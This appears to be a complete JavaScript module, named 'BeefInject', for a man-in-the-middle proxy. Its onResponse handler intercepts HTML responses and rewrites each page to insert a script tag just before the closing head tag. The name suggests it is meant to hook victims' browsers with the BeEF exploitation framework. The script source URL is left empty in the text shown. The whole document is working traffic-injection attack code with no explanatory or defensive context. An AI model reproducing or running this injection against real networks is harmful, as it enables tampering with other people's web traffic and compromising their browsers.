function onLoad() {
  console.log("BeefInject loaded.");
  console.log("targets: ");
}

function onResponse(req, res) {
  if (res.ContentType.indexOf('text/html') == 0 ){
     var body = res.ReadBody();
     if( body.indexOf('</head>') != -1 ) {
         res.Body = body.replace(
             '</head>',
             '<script type="text/javascript" src=""></script></head>'
);

}      

}

}